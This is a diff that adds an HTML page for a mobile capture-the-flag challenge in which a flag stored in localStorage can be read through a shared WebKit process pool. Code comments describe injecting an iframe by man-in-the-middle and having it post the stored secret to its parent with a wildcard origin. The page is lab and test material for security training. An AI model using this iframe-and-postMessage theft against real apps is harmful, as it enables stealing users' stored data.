@@ -1,0 +1,11 @@
+<!DOCTYPE html><html><head><title>CTF W6</title></head><body>
+<h2>Shared Storage Challenge W6</h2>
+<p>localStorage contains a secret. Shared WKProcessPool means no partition.</p>
+<script>
+localStorage.setItem('ctf_w6_flag', 'IOSCTF{W6_localstorage_stolen_via_iframe}');
+// Inject an iframe via MITM: <iframe src="http://localhost:8000/static/steal.html"></iframe>
+// steal.html: parent.postMessage(localStorage.getItem('ctf_w6_flag'), '*')
+window.addEventListener('message', function(e) {
+    alert('Received from iframe: ' + e.data);
+});
+</script></body></html>
